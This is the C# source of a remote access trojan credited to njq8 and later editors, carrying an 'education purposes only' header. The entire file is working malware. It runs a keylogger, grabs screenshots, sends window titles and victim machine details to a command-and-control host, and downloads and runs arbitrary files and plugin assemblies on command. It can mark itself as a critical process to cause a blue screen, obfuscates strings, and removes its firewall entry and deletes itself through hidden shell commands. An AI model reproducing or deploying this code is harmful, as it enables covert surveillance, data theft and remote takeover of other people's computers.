using System;
using System.IO;
using System.Net;
using System.Text;
using System.Drawing;
using Microsoft.Win32;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.Net.Sockets;
using System.Windows.Forms;
using System.IO.Compression;
using System.Drawing.Imaging;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

/**
 * Original Author: njq8 (VB.NET)
 * 
 * Rewritten by: Etor Madiv
 * 
 * Edited by: NYAN CAT
 * 
 * To use for education purposes only.
 */

namespace j
{
    public class Core
    {
        #region Fields Definition

        public static Mutex GlobalMutex;

        public static String MutexName = "279f6960ed84a752570aca7fb2dc1552";

        public static FileInfo CurrentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);

        public static Keylogger KeyloggerInstance = null;

        public static Boolean BSoDActive = Convert.ToBoolean("False");

        public static Boolean IsConnected = false;

        public static String Splitter = "|'|'|";

        public static String LastCapturedImageMD5 = "";

        public static TcpClient CurrentTcpClient = null;

        public static Byte[] BytesArray = new Byte[0x1401];

        public static MemoryStream Memory = new MemoryStream();

        public static Object CurrentPlugin = null;

        public static String Host = "127.0.0.1";

        public static String Port = "5552";

        public static String VictimsOwner = "SGFjS2Vk";

        public static String Version = "0.7d";

        #endregion

        public static void Start()
        {
            try
            {
                Registry.CurrentUser.SetValue("di", "!");
            }
            catch (Exception)
            {

            }

            Thread.Sleep(5000);

            bool notAlreadyRunning = false;

            GlobalMutex = new Mutex(true, MutexName, out notAlreadyRunning);

            if (!notAlreadyRunning)
            {
                Environment.Exit(0);
            }

            new Thread(PrincipalWorker).Start();

            try
            {
                KeyloggerInstance = new Keylogger();

                new Thread(KeyloggerInstance.KeyloggerWorker).Start();
            }
            catch (Exception)
            {

            }

            int counter = 0;

            string previousForegroundWindowTitle = "";

            if (BSoDActive)
            {
                try
                {
                    SystemEvents.SessionEnding += new SessionEndingEventHandler(SessionEndingCallback);

                    SetInformationProcess(1);
                }
                catch (Exception)
                {

                }
            }

            while (true)
            {
                Thread.Sleep(1000);

                if (!IsConnected)
                {
                    previousForegroundWindowTitle = "";
                }

                Application.DoEvents();

                try
                {
                    counter++;

                    if (counter == 5)
                    {
                        try
                        {
                            Process.GetCurrentProcess().MinWorkingSet = (IntPtr)0x400;
                        }
                        catch (Exception)
                        {

                        }
                    }

                    if (counter >= 8)
                    {
                        counter = 0;

                        string currentForegroundWindowTitle = GetForegroundWindowTitle();

                        if (previousForegroundWindowTitle != currentForegroundWindowTitle)
                        {
                            previousForegroundWindowTitle = currentForegroundWindowTitle;

                            SendString("zwazwczwtzw".Replace("zw", "") + Splitter
                                + currentForegroundWindowTitle);
                        }
                    }

                }
                catch (Exception)
                {

                }
            }
        }

        public static void PrincipalWorker()
        {
            Memory = new MemoryStream();

            while (true)
            {
                LastCapturedImageMD5 = "";

                do
                {
                    try
                    {
                        if (CurrentPlugin != null)
                        {
                            CurrentPlugin.GetType().GetMethod("clear").Invoke(CurrentPlugin, new object[0]);

                            CurrentPlugin = null;
                        }
                    }
                    catch (Exception)
                    {

                    }

                    IsConnected = false;
                }
                while (!Connect());

                IsConnected = true;

                try
                {

                    while (true)
                    {
                        if (CurrentTcpClient.Available < 1)
                        {
                            CurrentTcpClient.Client.Poll(-1, SelectMode.SelectRead);
                        }

                        if (CurrentTcpClient.Available > 0)
                        {
                            string receivedNumberString = "";

                            long receivedNumber = 0;

                            while (true)
                            {
                                if (CurrentTcpClient.Available < 1)
                                {
                                    CurrentTcpClient.Client.Poll(-1, SelectMode.SelectRead);
                                }

                                int charCode = CurrentTcpClient.GetStream().ReadByte();

                                if (charCode == 0)
                                {
                                    receivedNumber = long.Parse(receivedNumberString);

                                    if (receivedNumber == 0L)
                                    {
                                        receivedNumberString = "";

                                        SendString("");
                                    }
                                    else if (receivedNumber > 0L)
                                    {
                                        long receivedBytesCount = 0;

                                        do
                                        {
                                            BytesArray = new byte[CurrentTcpClient.Available];

                                            int count = CurrentTcpClient.Client.Receive(
                                                BytesArray, 0,
                                                (BytesArray.Length + receivedBytesCount > receivedNumber) ?
                                                (int)(receivedNumber - receivedBytesCount) :
                                                BytesArray.Length,
                                                SocketFlags.None
                                            );

                                            receivedBytesCount += count;

                                            Memory.Write(BytesArray, 0, count);

                                        } while (receivedBytesCount < receivedNumber);

                                        Thread t = new Thread(() =>
                                        {
                                            HandleData(Memory.ToArray());
                                        });

                                        t.Start();

                                        t.Join(100);

                                        Memory.Dispose();

                                        Memory = new MemoryStream();

                                        receivedNumberString = "";
                                    }
                                }
                                else if (charCode == -1)
                                {
                                    throw new Exception("Unknown error");
                                }
                                else
                                {
                                    receivedNumberString += Convert.ToChar(charCode);
                                }
                            }
                        }
                    }

                }
                catch (Exception)
                {

                }
            }
        }

        public static void SessionEndingCallback(object sender, SessionEndingEventArgs e)
        {
            SetInformationProcess(0);
        }

        public static void SetInformationProcess(int i)
        {
            try
            {
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
            }
            catch (Exception)
            {

            }
        }

        public static string GetForegroundWindowTitle()
        {
            try
            {
                IntPtr foregroundWindow = GetForegroundWindow();

                if (foregroundWindow == IntPtr.Zero)
                {
                    return "";
                }

                StringBuilder sb = new StringBuilder(
                    new String(' ', (GetWindowTextLength(foregroundWindow) + 1))
                );

                GetWindowText(foregroundWindow, sb, sb.Length);

                return StringToBase64(sb.ToString());
            }
            catch (Exception)
            {

            }

            return "";
        }

        public static bool SendString(string s)
        {
            return SendBytes(StringToBytes(s));
        }

        private static bool CompareFileInfo(FileInfo leftFileInfo, FileInfo rightFileInfo)
        {
            if (leftFileInfo.Name.ToLower() == rightFileInfo.Name.ToLower())
            {
                DirectoryInfo leftDirectoryInfo = leftFileInfo.Directory;

                DirectoryInfo rightDirectoryInfo = rightFileInfo.Directory;

                do
                {
                    if (leftDirectoryInfo.Name.ToLower() != rightDirectoryInfo.Name.ToLower())
                    {
                        return false;
                    }

                    leftDirectoryInfo = leftDirectoryInfo.Parent;

                    rightDirectoryInfo = rightDirectoryInfo.Parent;

                    if ((leftDirectoryInfo == null) && (rightDirectoryInfo == null))
                    {
                        return true;
                    }

                    if (leftDirectoryInfo == null)
                    {
                        return false;
                    }
                }
                while (rightDirectoryInfo != null);
            }

            return false;
        }

        public static void HandleData(byte[] b)
        {
            string[] dataArray = BytesToString(b).Split(new string[] { Splitter }, StringSplitOptions.None);

            try
            {
                byte[] buffer;

                string command = dataArray[0];

                switch (command)
                {
                    case "ll":

                        IsConnected = false;

                        return;

                    case "kl":

                        SendString("kl" + Splitter + StringToBase64(KeyloggerInstance.keyStrokesLog));

                        return;

                    case "prof":

                        switch (dataArray[1])
                        {
                            case "~":

                                StoreValueOnRegistry(dataArray[2], dataArray[3], RegistryValueKind.String);

                                break;

                            case "!":

                                StoreValueOnRegistry(dataArray[2], dataArray[3], RegistryValueKind.String);

                                SendString("getvalue" + Splitter + dataArray[1] + Splitter
                                    + GetValueFromRegistry(dataArray[1], ""));

                                break;

                            case "@":

                                DeleteValueFromRegistry(dataArray[2]);

                                break;
                        }

                        return;

                    case "rn":

                        if (dataArray[2][0] == '\x001f')
                        {
                            try
                            {
                                using (MemoryStream ms = new MemoryStream())
                                {
                                    int length = (dataArray[0] + Splitter + dataArray[1] + Splitter).Length;

                                    ms.Write(b, length, b.Length - length);

                                    buffer = DecompressGzip(ms.ToArray());
                                }
                            }
                            catch (Exception)
                            {
                                SendString("MSG" + Splitter + "Execute ERROR");

                                SendString("bla");

                                return;
                            }
                        }
                        else
                        {
                            WebClient client = new WebClient();

                            try
                            {
                                buffer = client.DownloadData(dataArray[2]);
                            }
                            catch (Exception)
                            {
                                SendString("MSG" + Splitter + "Download ERROR");

                                SendString("bla");

                                return;
                            }
                        }

                        SendString("bla");

                        string path = Path.GetTempFileName() + "." + dataArray[1];

                        try
                        {
                            File.WriteAllBytes(path, buffer);

                            Process.Start(path);

                            SendString("MSG" + Splitter + "Executed As " + new FileInfo(path).Name);
                        }
                        catch (Exception e)
                        {
                            SendString("MSG" + Splitter + "Execute ERROR " + e.Message);
                        }

                        return;

                    case "inv":
                        {
                            byte[] t = (byte[])GetValueFromRegistry(dataArray[1], new byte[0]);

                            if ((dataArray[3].Length < 10) && (t.Length == 0))
                            {
                                SendString("pl" + Splitter + dataArray[1] + Splitter + "1");
                            }
                            else
                            {
                                if (dataArray[3].Length > 10)
                                {
                                    using (MemoryStream ms = new MemoryStream())
                                    {
                                        int offset = (dataArray[0] + Splitter + dataArray[1] + Splitter
                                            + dataArray[2] + Splitter).Length;

                                        ms.Write(b, offset, b.Length - offset);

                                        t = DecompressGzip(ms.ToArray());
                                    }

                                    StoreValueOnRegistry(dataArray[1], t, RegistryValueKind.Binary);
                                }

                                SendString("pl" + Splitter + dataArray[1] + Splitter + "0");

                                object objectValue = Plugin(t, "A");

                                objectValue.GetType().GetField("H").SetValue(objectValue, Host);

                                objectValue.GetType().GetField("P").SetValue(objectValue, Convert.ToInt32(Port));

                                objectValue.GetType().GetField("OSK").SetValue(objectValue, dataArray[2]);

                                objectValue.GetType().GetMethod("Start").Invoke(objectValue, new object[0]);

                                while (IsConnected &&
                                    !(bool)(objectValue.GetType().GetField("OFF").GetValue(objectValue)))
                                {
                                    Thread.Sleep(1);
                                }

                                objectValue.GetType().GetField("OFF").SetValue(objectValue, true);
                            }
                            return;
                        }

                    case "ret":
                        {
                            byte[] buffer3 = (byte[])GetValueFromRegistry(dataArray[1], new byte[0]);

                            if ((dataArray[2].Length < 10) & (buffer3.Length == 0))
                            {
                                SendString("pl" + Splitter + dataArray[1] + Splitter + "1");
                            }
                            else
                            {
                                if (dataArray[2].Length > 10)
                                {
                                    using (MemoryStream ms = new MemoryStream())
                                    {
                                        int length = (dataArray[0] + Splitter + dataArray[1] + Splitter).Length;

                                        ms.Write(b, length, b.Length - length);

                                        buffer3 = DecompressGzip(ms.ToArray());
                                    }
                                    StoreValueOnRegistry(dataArray[1], buffer3, RegistryValueKind.Binary);
                                }

                                SendString("pl" + Splitter + dataArray[1] + Splitter + "0");

                                object instance = Plugin(buffer3, "A");

                                SendString("ret" + Splitter + dataArray[1] + Splitter +
                                    StringToBase64("" + instance.GetType().GetMethod("GT").Invoke(
                                        instance, new object[0]
                                    ))
                                );
                            }
                            return;
                        }

                    case "CAP":
                        {
                            Rectangle bounds = Screen.PrimaryScreen.Bounds;

                            Bitmap originalBmp = new Bitmap(
                                Screen.PrimaryScreen.Bounds.Width,
                                bounds.Height,
                                PixelFormat.Format16bppRgb555
                            );

                            Graphics g = Graphics.FromImage(originalBmp);

                            Size blockRegionSize = new Size(originalBmp.Width, originalBmp.Height);

                            g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);

                            try
                            {
                                blockRegionSize = new Size(32, 32);

                                bounds = new Rectangle(Cursor.Position, blockRegionSize);

                                Cursors.Default.Draw(g, bounds);
                            }
                            catch (Exception)
                            {

                            }

                            g.Dispose();

                            Bitmap croppedBmp = new Bitmap(
                                Convert.ToInt32(dataArray[1]),
                                Convert.ToInt32(dataArray[2])
                            );

                            g = Graphics.FromImage(croppedBmp);

                            g.DrawImage(originalBmp, 0, 0, croppedBmp.Width, croppedBmp.Height);

                            g.Dispose();

                            MemoryStream ms1 = new MemoryStream();

                            b = StringToBytes("CAP" + Splitter);

                            ms1.Write(b, 0, b.Length);

                            MemoryStream ms2 = new MemoryStream();

                            croppedBmp.Save(ms2, ImageFormat.Jpeg);

                            string capturedImageMD5 = MD5(ms2.ToArray());

                            if (capturedImageMD5 != LastCapturedImageMD5)
                            {
                                LastCapturedImageMD5 = capturedImageMD5;

                                ms1.Write(ms2.ToArray(), 0, (int)ms2.Length);
                            }
                            else
                            {
                                ms1.WriteByte(0);
                            }

                            SendBytes(ms1.ToArray());

                            ms1.Dispose();

                            ms2.Dispose();

                            originalBmp.Dispose();

                            croppedBmp.Dispose();

                            return;
                        }

                    case "un":

                        switch (dataArray[1])
                        {
                            case "~":

                                Uninstall();

                                break;

                            case "!":

                                SetInformationProcess(0);

                                Application.Exit();

                                break;

                            case "@":

                                SetInformationProcess(0);

                                Process.Start(CurrentAssemblyFileInfo.FullName);

                                Application.Exit();

                                break;
                        }
                        return;

                    case "up":
                        {

                            byte[] bytes = null;

                            if (dataArray[1][0] == '\x001f')
                            {
                                try
                                {
                                    using (MemoryStream ms = new MemoryStream())
                                    {
                                        int length = (dataArray[0] + Splitter).Length;

                                        ms.Write(b, length, b.Length - length);

                                        bytes = DecompressGzip(ms.ToArray());
                                    }
                                }
                                catch (Exception)
                                {
                                    SendString("MSG" + Splitter + "Update ERROR");

                                    SendString("bla");

                                    return;
                                }
                            }
                            else
                            {
                                WebClient client = new WebClient();

                                try
                                {
                                    bytes = client.DownloadData(dataArray[1]);
                                }
                                catch (Exception)
                                {
                                    SendString("MSG" + Splitter + "Update ERROR");

                                    SendString("bla");

                                    return;
                                }

                            }

                            SendString("bla");

                            string fileName = Path.GetTempFileName() + ".exe";

                            try
                            {

                                SendString("MSG" + Splitter + "Updating To " + new FileInfo(fileName).Name);

                                Thread.Sleep(2000);

                                File.WriteAllBytes(fileName, bytes);

                                Process.Start(fileName, "..");
                            }
                            catch (Exception e)
                            {
                                SendString("MSG" + Splitter + "Update ERROR " + e.Message);

                                return;
                            }

                            Uninstall();

                            return;
                        }

                    case "Ex":
                        {

                            if (CurrentPlugin == null)
                            {
                                SendString("PLG");

                                int counter = 0;

                                while (!(((CurrentPlugin != null) || (counter == 20)) || !IsConnected))
                                {
                                    counter++;

                                    Thread.Sleep(1000);
                                }

                                if (CurrentPlugin == null || !IsConnected)
                                {
                                    return;
                                }
                            }

                            object[] arguments = new object[] { b };

                            CurrentPlugin.GetType().GetMethod("ind").Invoke(CurrentPlugin, arguments);

                            b = (byte[])arguments[0];

                            return;
                        }

                    case "PLG":
                        {
                            using (MemoryStream ms = new MemoryStream())
                            {
                                int length = (dataArray[0] + Splitter).Length;

                                ms.Write(b, length, b.Length - length);

                                CurrentPlugin = Plugin(DecompressGzip(ms.ToArray()), "A");
                            }

                            CurrentPlugin.GetType().GetField("H").SetValue(CurrentPlugin, Host);

                            CurrentPlugin.GetType().GetField("P").SetValue(CurrentPlugin, Convert.ToInt32(Port));

                            CurrentPlugin.GetType().GetField("C").SetValue(CurrentPlugin, CurrentTcpClient);

                            return;
                        }
                }
            }
            catch (Exception e)
            {
                if ((dataArray.Length > 0) && ((dataArray[0] == "Ex") || (dataArray[0] == "PLG")))
                {
                    CurrentPlugin = null;
                }

                try
                {
                    SendString("ER" + Splitter + dataArray[0] + Splitter + e.Message);
                }
                catch (Exception)
                {

                }
            }
        }

        public static bool Connect()
        {
            IsConnected = false;

            Thread.Sleep(2000);

            lock (CurrentAssemblyFileInfo)
            {
                try
                {
                    if (CurrentTcpClient != null)
                    {
                        try
                        {
                            CurrentTcpClient.Close();

                            CurrentTcpClient = null;
                        }
                        catch (Exception)
                        {

                        }
                    }

                    try
                    {
                        Memory.Dispose();
                    }
                    catch (Exception)
                    {

                    }
                }
                catch (Exception)
                {

                }

                try
                {
                    Memory = new MemoryStream();

                    CurrentTcpClient = new TcpClient();

                    CurrentTcpClient.ReceiveBufferSize = 204800;

                    CurrentTcpClient.SendBufferSize = 204800;

                    CurrentTcpClient.Client.SendTimeout = 10000;

                    CurrentTcpClient.Client.ReceiveTimeout = 10000;

                    CurrentTcpClient.Connect(Host, Convert.ToInt32(Port));

                    IsConnected = true;

                    SendString(GetGenericInfo());

                    try
                    {
                        string info = "";

                        string CRLF = "\r\n";

                        if ("" + GetValueFromRegistry("zwvzwnzw".Replace("zw", ""), "") == "")
                        {
                            info += Base64ToString(VictimsOwner) + CRLF;
                        }
                        else
                        {
                            info += Base64ToString("" + GetValueFromRegistry("zwvzwnzw".Replace("zw", ""), "")) 
                                + CRLF;
                        }

                        info += Host + "hhhh:".Remove(0, 4) + Port 
                            + CRLF + "" 
                            + CRLF + "" 
                            + CRLF + "" 
                            + CRLF + "" 
                            + CRLF + "" 
                            + CRLF + BSoDActive;

                        SendString("zwizwnzwfzw".Replace("zw", "") + Splitter + StringToBase64(info));
                    }
                    catch (Exception)
                    {

                    }
                }
                catch (Exception)
                {
                    IsConnected = false;
                }
            }

            return IsConnected;
        }

        public static string StringToBase64(string s)
        {
            return Convert.ToBase64String(StringToBytes(s));
        }

        public static byte[] StringToBytes(string S)
        {
            return Encoding.UTF8.GetBytes(S);
        }

        public static bool SendBytes(byte[] b)
        {
            if (!IsConnected)
            {
                return false;
            }

            try
            {
                lock (CurrentAssemblyFileInfo)
                {
                    if (!IsConnected)
                    {
                        return false;
                    }

                    using (MemoryStream ms = new MemoryStream())
                    {
                        int length = b.Length;

                        byte[] buffer = StringToBytes(length + "\0");

                        ms.Write(buffer, 0, buffer.Length);

                        ms.Write(b, 0, b.Length);

                        CurrentTcpClient.Client.Send(ms.ToArray(), 0, (int)ms.Length, SocketFlags.None);
                    }
                }
            }
            catch (Exception)
            {
                try
                {
                    if (IsConnected)
                    {
                        IsConnected = false;

                        CurrentTcpClient.Close();
                    }
                }
                catch (Exception)
                {

                }
            }

            return IsConnected;
        }

        public static string BytesToString(byte[] bytes)
        {
            return Encoding.UTF8.GetString(bytes);
        }

        public static bool StoreValueOnRegistry(string name, object defaultValue, RegistryValueKind kind)
        {
            try
            {
                Registry.CurrentUser.CreateSubKey(@"Software\" + MutexName).SetValue(name, defaultValue, kind);

                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static object GetValueFromRegistry(string name, object defaultValue)
        {
            try
            {
                return Registry.CurrentUser.OpenSubKey(@"Software\" + MutexName).GetValue(name, defaultValue);
            }
            catch (Exception)
            {
                return defaultValue;
            }
        }

        public static void DeleteValueFromRegistry(string name)
        {
            try
            {
                Registry.CurrentUser.OpenSubKey(@"Software\" + MutexName, true).DeleteValue(name);
            }
            catch (Exception)
            {

            }
        }

        public static byte[] DecompressGzip(byte[] buffer)
        {
            byte[] decompressedBuffer = null;

            using (MemoryStream ms = new MemoryStream(buffer))
            {
                using (GZipStream gz = new GZipStream(ms, CompressionMode.Decompress))
                {
                    byte[] countBuffer = new byte[4];

                    ms.Position = ms.Length - 5;

                    ms.Read(countBuffer, 0, 4);

                    int count = BitConverter.ToInt32(countBuffer, 0);

                    ms.Position = 0;

                    decompressedBuffer = new byte[count];

                    gz.Read(decompressedBuffer, 0, count);
                }
            }

            return decompressedBuffer;
        }

        public static object Plugin(byte[] rawPlugin, string className)
        {
            foreach (Module module in Assembly.Load(rawPlugin).GetModules())
            {
                foreach (Type type in module.GetTypes())
                {
                    if (type.FullName.EndsWith("." + className))
                    {
                        return module.Assembly.CreateInstance(type.FullName);
                    }
                }
            }

            return null;
        }

        public static string MD5(byte[] buffer)
        {
            buffer = new MD5CryptoServiceProvider().ComputeHash(buffer);

            string result = "";

            foreach (byte b in buffer)
            {
                result += b.ToString("x2");
            }

            return result;
        }

        public static void Uninstall()
        {
            SetInformationProcess(0);

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "nzwezwtzwszwh".Replace("zw", ""),
                    Arguments = "fizwrzwezwwalzwl dzwezwlzwezwte azwllowedprogrzwam \""
                        .Replace("zw", "") + CurrentAssemblyFileInfo.FullName + "\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch (Exception)
            {

            }


            try
            {
                Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(MutexName, false);
            }
            catch (Exception)
            {

            }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c ping 0 -n 2 & del \"" + CurrentAssemblyFileInfo.FullName + "\"",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch (Exception)
            {

            }

            Environment.Exit(0);
        }

        public static string GetGenericInfo()
        {
            string info = "ll" + Splitter;

            try
            {
                if ("" + GetValueFromRegistry("vn", "") == "")
                {
                    info += StringToBase64(Base64ToString(VictimsOwner) + "_" + GetHardDriveSerialNumber()) 
                        + Splitter;
                }
                else
                {
                    info += StringToBase64(Base64ToString("" + GetValueFromRegistry("vn", ""))
                        + "_" + GetHardDriveSerialNumber()) + Splitter;
                }
            }
            catch (Exception)
            {
                info += StringToBase64(GetHardDriveSerialNumber()) + Splitter;
            }

            try
            {
                info += Environment.MachineName + Splitter;
            }
            catch (Exception)
            {
                info += "??" + Splitter;
            }

            try
            {
                info += Environment.UserName + Splitter;
            }
            catch (Exception)
            {
                info += "??" + Splitter;
            }

            try
            {
                info += CurrentAssemblyFileInfo.LastWriteTime.Date.ToString("yy-MM-dd") + Splitter;
            }
            catch (Exception)
            {
                info += "??-??-??" + Splitter;
            }

            info += "" + Splitter;

            try
            {
                info += GetOSFullname();
            }
            catch (Exception)
            {
                info += "??";
            }

            try
            {
                if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
                {
                    info += " x64" + Splitter;
                }
                else
                {
                    info += " x86" + Splitter;
                }
            }
            catch (Exception)
            {
                info += Splitter;
            }

            if (CameraExists())
            {
                info += "Yes" + Splitter;
            }
            else
            {
                info += "No" + Splitter;
            }

            info += Version + Splitter + ".." + Splitter + GetForegroundWindowTitle() + Splitter;

            try
            {
                foreach (string valueName in Registry.CurrentUser.CreateSubKey(
                        @"Software\" + MutexName,
                        RegistryKeyPermissionCheck.Default
                    ).GetValueNames()
                )
                {
                    if (valueName.Length == 32)
                    {
                        info += valueName + ",";
                    }
                }
            }
            catch (Exception)
            {

            }

            return info;
        }

        public static string Base64ToString(string s)
        {
            return BytesToString(Convert.FromBase64String(s));
        }

        public static string GetOSFullname()
        {
            string productName = "";

            string csdVersion = "";

            string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";

            try
            {
                RegistryKey rk = Registry.LocalMachine.OpenSubKey(registryPath);

                if (rk != null)
                {
                    productName += rk.GetValue("ProductName");
                }
            }
            catch (Exception)
            {

            }

            try
            {
                RegistryKey rk = Registry.LocalMachine.OpenSubKey(registryPath);

                if (rk != null)
                {
                    csdVersion += rk.GetValue("CSDVersion");
                }
            }
            catch (Exception)
            {

            }

            if (productName != "")
            {
                return (productName.StartsWith("Microsoft") ? "" : "Microsoft ")
                    + productName + (csdVersion != "" ? " " + csdVersion : "");
            }

            return "";
        }

        public static string GetHardDriveSerialNumber()
        {
            try
            {
                uint volumeSerialNumber;

                StringBuilder lpVolumeNameBuffer = new StringBuilder();

                uint lpMaximumComponentLength;

                FileSystemFeature lpFileSystemFlags;

                StringBuilder lpFileSystemNameBuffer = new StringBuilder();

                GetVolumeInformation(
                    Environment.GetEnvironmentVariable("SystemDrive") + @"\",
                    lpVolumeNameBuffer,
                    0,
                    out volumeSerialNumber,
                    out lpMaximumComponentLength,
                    out lpFileSystemFlags,
                    lpFileSystemNameBuffer,
                    0
                );

                return volumeSerialNumber.ToString("X");
            }
            catch (Exception)
            {
                return "ERR";
            }
        }

        public static bool CameraExists()
        {
            try
            {
                short wDriverIndex = 0;

                do
                {
                    string lpszVer = null;

                    string lpzsName = new string(' ', 100);

                    if (capGetDriverDescriptionA(wDriverIndex, ref lpzsName, 100, ref lpszVer, 100))
                    {
                        return true;
                    }

                    wDriverIndex++;
                }
                while (wDriverIndex <= 4);
            }
            catch (Exception)
            {

            }

            return false;
        }

        #region PInvokes

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtSetInformationProcess(IntPtr hProcess,
            int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        extern static bool GetVolumeInformation(
          string rootPathName,
          StringBuilder volumeNameBuffer,
          int volumeNameSize,
          out uint volumeSerialNumber,
          out uint maximumComponentLength,
          out FileSystemFeature fileSystemFlags,
          StringBuilder fileSystemNameBuffer,
          int nFileSystemNameSize);

        //This function enables enumerate the web cam devices
        [DllImport("avicap32.dll")]
        protected static extern bool capGetDriverDescriptionA(short wDriverIndex,
            [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName,
           int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer);

        [Flags]
        enum FileSystemFeature : uint
        {
            /// <summary>
            /// The file system preserves the case of file names when it places a name on disk.
            /// </summary>
            CasePreservedNames = 2,

            /// <summary>
            /// The file system supports case-sensitive file names.
            /// </summary>
            CaseSensitiveSearch = 1,

            /// <summary>
            /// The specified volume is a direct access (DAX) volume. This flag was introduced in Windows 10, version 1607.
            /// </summary>
            DaxVolume = 0x20000000,

            /// <summary>
            /// The file system supports file-based compression.
            /// </summary>
            FileCompression = 0x10,

            /// <summary>
            /// The file system supports named streams.
            /// </summary>
            NamedStreams = 0x40000,

            /// <summary>
            /// The file system preserves and enforces access control lists (ACL).
            /// </summary>
            PersistentACLS = 8,

            /// <summary>
            /// The specified volume is read-only.
            /// </summary>
            ReadOnlyVolume = 0x80000,

            /// <summary>
            /// The volume supports a single sequential write.
            /// </summary>
            SequentialWriteOnce = 0x100000,

            /// <summary>
            /// The file system supports the Encrypted File System (EFS).
            /// </summary>
            SupportsEncryption = 0x20000,

            /// <summary>
            /// The specified volume supports extended attributes. An extended attribute is a piece of
            /// application-specific metadata that an application can associate with a file and is not part
            /// of the file's data.
            /// </summary>
            SupportsExtendedAttributes = 0x00800000,

            /// <summary>
            /// The specified volume supports hard links. For more information, see Hard Links and Junctions.
            /// </summary>
            SupportsHardLinks = 0x00400000,

            /// <summary>
            /// The file system supports object identifiers.
            /// </summary>
            SupportsObjectIDs = 0x10000,

            /// <summary>
            /// The file system supports open by FileID. For more information, see FILE_ID_BOTH_DIR_INFO.
            /// </summary>
            SupportsOpenByFileId = 0x01000000,

            /// <summary>
            /// The file system supports re-parse points.
            /// </summary>
            SupportsReparsePoints = 0x80,

            /// <summary>
            /// The file system supports sparse files.
            /// </summary>
            SupportsSparseFiles = 0x40,

            /// <summary>
            /// The volume supports transactions.
            /// </summary>
            SupportsTransactions = 0x200000,

            /// <summary>
            /// The specified volume supports update sequence number (USN) journals. For more information,
            /// see Change Journal Records.
            /// </summary>
            SupportsUsnJournal = 0x02000000,

            /// <summary>
            /// The file system supports Unicode in file names as they appear on disk.
            /// </summary>
            UnicodeOnDisk = 4,

            /// <summary>
            /// The specified volume is a compressed volume, for example, a DoubleSpace volume.
            /// </summary>
            VolumeIsCompressed = 0x8000,

            /// <summary>
            /// The file system supports disk quotas.
            /// </summary>
            VolumeQuotas = 0x20
        }

        #endregion
    }
}
